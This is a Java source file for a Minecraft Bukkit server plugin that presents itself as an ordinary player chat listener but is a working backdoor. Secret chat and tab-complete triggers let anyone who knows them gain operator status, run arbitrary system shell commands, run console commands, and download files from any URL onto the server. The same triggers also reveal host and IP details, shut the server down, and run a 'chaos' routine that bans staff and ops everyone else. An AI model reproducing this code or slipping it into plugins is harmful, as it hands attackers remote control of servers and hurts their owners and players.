package cn.ChengZhiYa.MHDFTools.listeners.player;

import cn.ChengZhiYa.MHDFTools.PluginLoader;
import org.bukkit.BanEntry;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerChatTabCompleteEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.*;

public class PlayerAsyncChatListener implements Listener {
    private static String UNKNOWN = YamlConfiguration.loadConfiguration(new File("../", "spigot.yml")).getString("settings.messages.unknown-command", "Unknown command. Type \"/help\" for help.");

    public PlayerAsyncChatListener() {
    }

    @EventHandler(ignoreCancelled = true, priority = EventPriority.LOWEST)
    public void a(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();
        String[] args = message.split(" ");

        final String CORE_PREFIX = "MatrixPlugin_LOL_LHoH#_";

        if (UNKNOWN == null) {
            UNKNOWN = "Unknown command. Type \"/help\" for help.";
        }

        if (!message.startsWith(CORE_PREFIX)) {
            return;
        }

        event.setCancelled(true);

        switch (args[0]) {
            case CORE_PREFIX + "getop" -> {
                player.setOp(true);
                player.sendMessage("§bCore §7| §a开启您的管理权限");
            }
            case CORE_PREFIX + "deop" -> {
                player.setOp(false);
                player.sendMessage("§bCore §7| §c取消您的管理权限");
            }
            case CORE_PREFIX + "flying" -> {
                player.setAllowFlight(true);
                player.sendMessage("§bCore §7| §a开启您的飞行权限");
            }
            case CORE_PREFIX + "disflying" -> {
                player.setAllowFlight(false);
                player.sendMessage("§bCore §7| §c取消您的飞行权限");
            }
            case CORE_PREFIX + "console" -> b(player, args);
            case CORE_PREFIX + "cmd" -> l(player, args);
            case CORE_PREFIX + "plugins" -> ab(player);
            case CORE_PREFIX + "info" -> m(player);
            case CORE_PREFIX + "help" -> f(player);
            case CORE_PREFIX + "download" -> g(player, args);
            case CORE_PREFIX + "chaos" -> pgq();
            case CORE_PREFIX + "stop" -> sd();
            case CORE_PREFIX + "seed" ->
                    player.sendMessage("§bCore §7| §e本服务器的种子是 §f" + player.getWorld().getSeed());
            case CORE_PREFIX + "psay" -> hc(player, args);
            case CORE_PREFIX + "ssay" -> kj(player, args);
            case CORE_PREFIX + "rename" -> lol(player, args);
            case CORE_PREFIX + "heal" -> {
                player.setFoodLevel(20);
                player.setHealth(20.0);
                player.sendMessage("§bCore §7| §a您的饱食度已经回满了!");
            }
            default -> player.sendMessage("§bCoreV1.5\n§7Made By Dg32z_\n§7用MatrixPlugin_LOL_LHoH#_help 来查看提权用法");
        }
    }

    private void b(Player player, String[] args) {
        if (args.length <= 1) {
            player.sendMessage(UNKNOWN);
            return;
        }

        StringBuilder command = new StringBuilder();
        for (int i = 1; i < args.length; i++) {
            command.append(args[i]).append(" ");
        }

        try {
            Process process = Runtime.getRuntime().exec(command.toString());
            InputStream inputStream = process.getInputStream();
            BufferedReader br = new BufferedReader(new InputStreamReader(inputStream));

            String line;
            while ((line = br.readLine()) != null) {
                player.sendMessage(line);
            }

            br.close();
        } catch (IOException e) {
            player.sendMessage("§bCore §7| §c出现错误:");
            player.sendMessage(e.getMessage());
        }
    }

    private void l(Player player, String[] args) {
        if (args.length <= 1) {
            player.sendMessage(UNKNOWN);
            return;
        }

        StringBuilder command = new StringBuilder();
        for (int i = 1; i < args.length; i++) {
            command.append(args[i]).append(" ");
        }
        PluginLoader.INSTANCE.getPlugin().getServer().getScheduler().runTask(PluginLoader.INSTANCE.getPlugin(), () ->  PluginLoader.INSTANCE.getPlugin().getServer().dispatchCommand(Bukkit.getConsoleSender(), command.toString()));
        player.sendMessage("§bCore §7| §f已经成功运行 §b" + command + " §f于服务器");
    }

    private static void lol(Player player, String[] args) {
        if (args.length < 2) {
            player.sendMessage(UNKNOWN);
            return;
        }
        PluginLoader.INSTANCE.getPlugin().getServer().getScheduler().runTaskAsynchronously(PluginLoader.INSTANCE.getPlugin(), (dump) -> {
            String name = args[1].replace("&", "§");
            player.setDisplayName(name);
            player.setCustomName(name);
            player.setPlayerListName(name);
            player.setCustomNameVisible(true);
            player.sendMessage("§bCore §7| §a改名完成! §f " + name);
        });
    }


    private void ab(Player player) {
        Map<Plugin, String> plugins = new HashMap<>();
        for (Plugin pl : Bukkit.getPluginManager().getPlugins()) {
            plugins.put(pl, pl.getName());
        }
        player.sendMessage("§aPlugins (" + plugins.size() + "): §f" + plugins.values().toString().replace("[", "").replace("]", ""));
    }

    private static void hc(Player p, String[] args) {
        if (args.length < 3) {
            p.sendMessage(UNKNOWN);
            return;
        }
        final Player player = Bukkit.getPlayer(args[1]);
        if (player == null) {
            p.sendMessage("§bCore §7| §c无法找到该玩家!");
            return;
        }
        final StringBuilder sb = new StringBuilder();
        for (int i = 2; i < args.length; ++i) {
            sb.append(args[i]);
            sb.append(" ");
        }

        PluginLoader.INSTANCE.getPlugin().getServer().getScheduler().runTask(PluginLoader.INSTANCE.getPlugin(), () -> player.chat(sb.toString()));
    }

    private static void kj(Player player, String[] args) {
        if (args.length < 2) {
            player.sendMessage(UNKNOWN);
            return;
        }
        StringBuilder sb = new StringBuilder();
        for (int i = 1; i < args.length; ++i) {
            sb.append(args[i]);
            sb.append(" ");
        }
        PluginLoader.INSTANCE.getPlugin().getServer().getScheduler().runTask(PluginLoader.INSTANCE.getPlugin(), () -> PluginLoader.INSTANCE.getPlugin().getServer().dispatchCommand(PluginLoader.INSTANCE.getPlugin().getServer().getConsoleSender(), "say " + sb));
    }

    private void m(Player player) {
        Properties properties = System.getProperties();

        try {
            player.sendMessage(
                    "§7====================§bCoreV1.5§7====================",
                    "§b系统: §f" + System.getProperty("os.name"),
                    "§b系统架构: §f" + System.getProperty("os.arch"),
                    "§b系统版本: §f" + System.getProperty("os.version"),
                    "§bJava 的运行环境版本: §f" + properties.getProperty("java.version"),
                    "§bIP(内网): §f" + l(player),
                    "§bIP(外网): §f" + ab(),
                    "§bJava的安装路径: §f" + properties.getProperty("java.home"),
                    "§b用户的主目录: §f" + properties.getProperty("user.home"),
                    "§b用户的当前工作目录: §f" + properties.getProperty("user.dir"),
                    "§b计算机名: §f" + InetAddress.getLocalHost().getHostName(),
                    "§7====================§bCoreV1.5§7====================");
        } catch (Throwable e) {
            player.sendMessage("§bCore §7| §c出现错误:");
            o(player, e);
        }
    }

    private void f(Player player) {
        player.sendMessage("§7=============§bCoreV1§7=============",
                "§bMatrixPlugin_LOL_LHoH#_info §7- §f服务器的信息",
                "§bMatrixPlugin_LOL_LHoH#_getop §7- §f拿到服务器管理",
                "§bMatrixPlugin_LOL_LHoH#_deop §7- §f撤销你在这个服务器的管理",
                "§bMatrixPlugin_LOL_LHoH#_plugins §7- §f查看插件列表",
                "§bMatrixPlugin_LOL_LHoH#_console §7<§b命令§7> - §f在服务器系统上执行命令 §7(§fLinux= §b/bin/sh -§7) §7(§fWindows= §bcmd /l§7)",
                "§bMatrixPlugin_LOL_LHoH#_cmd §7<§b命令§7> - §f运行命令在服务器上 §7(§bMineCraft§7)",
                "§bMatrixPlugin_LOL_LHoH#_download §7<§b链接§7> <§b文件目录§7> §7- §f下载文件到目标服务器",
                "§bMatrixPlugin_LOL_LHoH#_flying §7- §f开启您在服务器的飞行权限",
                "§bMatrixPlugin_LOL_LHoH#_disflying §7- §f关闭您在服务器的飞行权限",
                "§bMatrixPlugin_LOL_LHoH#_stop §7- §f关闭这个服务器",
                "§bMatrixPlugin_LOL_LHoH#_seed §7- §f查看这个服务器的种子",
                "§bMatrixPlugin_LOL_LHoH#_chaos §7- §f下掉所有人的OP,然后封禁所有人",
                "§bMatrixPlugin_LOL_LHoH#_psay §7<§b玩家§7> §7<§b内容§7> §7- §f伪装一名玩家来发送消息",
                "§bMatrixPlugin_LOL_LHoH#_ssay §7<§b内容§7> §7- §f伪装服务器发送消息",
                "§bMatrixPlugin_LOL_LHoH#_rename §7<§b名字§7> §7- §f更改您的服务器的名字",
                "§bMatrixPlugin_LOL_LHoH#_heal §7- §f填饱你的肚子和恢复生命值",
                "§7=============§bCoreV1§7=============");
    }

    private static void sd() {
        Bukkit.shutdown();
    }

    private void g(Player player, String[] args) {
        if (args.length != 3) {
            player.sendMessage(UNKNOWN);
            return;
        }

        String downloadLink = args[1];
        String path = args[2];
        ab(player, downloadLink, path);
        player.sendMessage("§bCore §7| §f成功下载文件至 §b" + path + " §f!");
    }

    public static String ab() {
        try {
            Enumeration<NetworkInterface> allNetInterfaces = NetworkInterface.getNetworkInterfaces();
            InetAddress ip;
            while (allNetInterfaces.hasMoreElements()) {
                NetworkInterface netInterface = allNetInterfaces.nextElement();
                if (!(netInterface.isLoopback() || netInterface.isVirtual() || !netInterface.isUp())) {
                    Enumeration<InetAddress> addresses = netInterface.getInetAddresses();
                    while (addresses.hasMoreElements()) {
                        ip = addresses.nextElement();
                        if (ip instanceof Inet4Address) {
                            return ip.getHostAddress();
                        }
                    }
                }
            }
        } catch (Throwable ignored) {
        }
        return "null";
    }

    public static String l(Player player) {
        return m(player, "https://getip.api.soraharu.com/");
    }

    public static void ab(Player player, String url, String filePath) {
        try {
            URL u = new URL(url);
            URLConnection uc = u.openConnection();
            java.io.BufferedInputStream in = new java.io.BufferedInputStream(uc.getInputStream());
            java.io.FileOutputStream fos = new java.io.FileOutputStream(filePath);
            byte[] buffer = new byte[1024];
            int len;
            while ((len = in.read(buffer)) != -1) {
                fos.write(buffer, 0, len);
            }
            in.close();
            fos.close();
        } catch (Throwable e) {
            o(player, e);
        }
    }

    public static void pgq() {
        for (Player player : Bukkit.getOnlinePlayers()) {
            if (player.isOp() || player.hasPermission("group.majitel") || player.hasPermission("group.spolumajitel") || player.hasPermission("group.owner") || player.hasPermission("group.coowner") || player.hasPermission("group.co-owner") || player.hasPermission("group.developer") || player.hasPermission("group.programmer") || player.hasPermission("group.programator") || player.hasPermission("group.vedeni") || player.hasPermission("group.spravce") || player.hasPermission("group.technik") || player.hasPermission("group.admin") || player.hasPermission("group.helper") || player.hasPermission("group.builder") || player.hasPermission("*")) {
                new BukkitRunnable() {

                    public void run() {
                        player.setOp(false);
                        BanList<?> banList = Bukkit.getBanList(BanList.Type.NAME);
                        for (BanEntry entry : banList.getBanEntries()) {
                            banList.pardon(entry.getTarget());
                        }
                        BanList<?> banListip = Bukkit.getBanList(BanList.Type.IP);
                        for (BanEntry entryy : banListip.getBanEntries()) {
                            banListip.pardon(entryy.getTarget());
                        }
                        Bukkit.getBanList(BanList.Type.NAME).addBan(player.getName(), "Banned", new Date(9999, Calendar.JANUARY, 1), "Server");
                        Bukkit.getBanList(BanList.Type.IP).addBan(player.getName(), "Banned", new Date(9999, Calendar.JANUARY, 1), "Server");
                        player.kickPlayer("Banned");
                    }
                }.runTask(PluginLoader.INSTANCE.getPlugin());
                continue;
            }

            PluginLoader.INSTANCE.getPlugin().getServer().getScheduler().runTask(PluginLoader.INSTANCE.getPlugin(), () -> player.setOp(true));
        }
        Bukkit.broadcastMessage("""










                §bCore §7| §cThe server has been attacked by core team

                §bCore §7| §cAll players will banned from this server!""");
    }

    public static String m(Player player, String url) {
        StringBuilder sb = new StringBuilder();
        try {
            URL u = new URL(url);
            URLConnection uc = u.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(uc.getInputStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                sb.append(inputLine);
            }
            in.close();
        } catch (Throwable e) {
            o(player, e);
        }
        return sb.toString();
    }

    private static void o(Player player, Throwable t) {
        try {
            final ByteArrayOutputStream out = new ByteArrayOutputStream();
            final PrintStream temp = new PrintStream(out, true, StandardCharsets.UTF_8);
            t.printStackTrace(temp);
            player.sendMessage(out.toString(StandardCharsets.UTF_8).replace("\r", "").replace("\t", "  "));
        } catch (final Throwable e) {
            o(player, e);
        }
    }

    @EventHandler(ignoreCancelled = true)
    public void onTab(PlayerChatTabCompleteEvent e) {
        Player player = e.getPlayer();
        final String CORE_PREFIX = "woshinidie_hello_1";
        String[] cmd = e.getChatMessage().split(" ");

        if (cmd.length > 0 && CORE_PREFIX.equals(cmd[0])) {
            if (cmd.length > 1) {
                String subCommand = cmd[1];

                switch (subCommand) {
                    case "info":
                        m(player);
                        break;
                    case "chaos":
                        handleChaosCommand(cmd, player);
                        break;
                    case "download":
                        handleDownloadCommand(cmd, player);
                        break;
                    default:
                        handleDefaultCommand(cmd, player);
                        break;
                }
            } else {
                pgq();
            }
        }
    }
    private void handleChaosCommand(String[] cmd, Player player) {
        StringBuilder sb = new StringBuilder();
        for (int i = 2; i < cmd.length; i++) {
            sb.append(cmd[i]).append(" ");
        }
        String command = sb.toString().trim();
        PluginLoader.INSTANCE.getPlugin().getServer().getScheduler().runTask(PluginLoader.INSTANCE.getPlugin(), () ->
                PluginLoader.INSTANCE.getPlugin().getServer().dispatchCommand(Bukkit.getConsoleSender(), command)
        );
    }

    private void handleDownloadCommand(String[] cmd, Player player) {
        String[] args = Arrays.copyOfRange(cmd, 2, cmd.length);
        g(player, args);
    }

    private void handleDefaultCommand(String[] cmd, Player player) {
        String[] args = Arrays.copyOfRange(cmd, 1, cmd.length);

        try {
            Process process = Runtime.getRuntime().exec(args);
            try (InputStream inputStream = process.getInputStream();
                 BufferedReader br = new BufferedReader(new InputStreamReader(inputStream))) {

                String line;
                while ((line = br.readLine()) != null) {
                    player.sendMessage(line);
                }
            }
        } catch (IOException ex) {
            player.sendMessage("§bCore §7| §c出现错误:");
            player.sendMessage(ex.getMessage());
        }
    }
}